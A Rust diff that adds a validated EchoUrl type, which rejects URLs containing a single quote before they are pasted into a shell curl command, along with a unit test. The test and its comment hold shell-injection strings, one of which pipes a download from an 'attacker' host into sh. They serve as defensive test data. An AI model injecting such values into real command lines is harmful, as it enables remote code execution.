@@ -76,6 +76,45 @@ pub fn parse_ip(text: &str) -> Option<std::net::IpAddr> {
     text.trim().parse().ok()
 }
 
+/// The endpoint that echoes a caller's address back, refused if it could not be quoted safely.
+///
+/// This value reaches a node inside a shell command line, single-quoted:
+/// `curl -fsS --max-time 8 '<url>'`. Inside single quotes a POSIX shell treats every character
+/// literally except the quote itself, so a URL carrying one could end the quoting and continue
+/// as a command of its own. Refusing that once, here, is what makes it impossible everywhere the
+/// value is used: there is no other way to build one, and nothing downstream can receive a URL
+/// that was never checked.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct EchoUrl(String);
+
+impl EchoUrl {
+    pub fn as_str(&self) -> &str {
+        &self.0
+    }
+}
+
+/// A URL that cannot be put into a command line safely.
+#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
+#[error("an echo URL may not contain a quote: {0}")]
+pub struct QuotedEchoUrl(pub String);
+
+impl std::str::FromStr for EchoUrl {
+    type Err = QuotedEchoUrl;
+
+    fn from_str(s: &str) -> Result<Self, Self::Err> {
+        if s.contains('\'') {
+            return Err(QuotedEchoUrl(s.to_string()));
+        }
+        Ok(Self(s.to_string()))
+    }
+}
+
+impl std::fmt::Display for EchoUrl {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.write_str(&self.0)
+    }
+}
+
 /// One check outcome. `key` is stable across runs and is what the diff compares.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct CheckResult {
@@ -306,6 +345,28 @@ mod tests {
         assert!(a.check_key().starts_with("channel:"));
         // Stable across calls: the diff between two runs depends on it.
         assert_eq!(a.check_key(), channel("alpha.example.com", 443).check_key());
+    }
+
+    #[test]
+    fn an_echo_url_carrying_a_quote_is_refused() {
+        use std::str::FromStr;
+
+        // The shape that made this a type: `'; curl attacker | sh; echo '` would close the
+        // quoting of the command line it is pasted into and run as its own command.
+        let hostile = "https://example.com/'; id; echo '";
+        assert_eq!(
+            EchoUrl::from_str(hostile),
+            Err(QuotedEchoUrl(hostile.to_string()))
+        );
+        assert!(EchoUrl::from_str(hostile)
+            .unwrap_err()
+            .to_string()
+            .contains("quote"));
+
+        let ordinary = "https://api.ipify.org";
+        assert_eq!(EchoUrl::from_str(ordinary).unwrap().as_str(), ordinary);
+        // Everything else a URL may carry is literal inside single quotes, and stays allowed.
+        assert!(EchoUrl::from_str("https://e.example.com/ip?fmt=$x&y=`z`;#|").is_ok());
     }
 
     #[test]
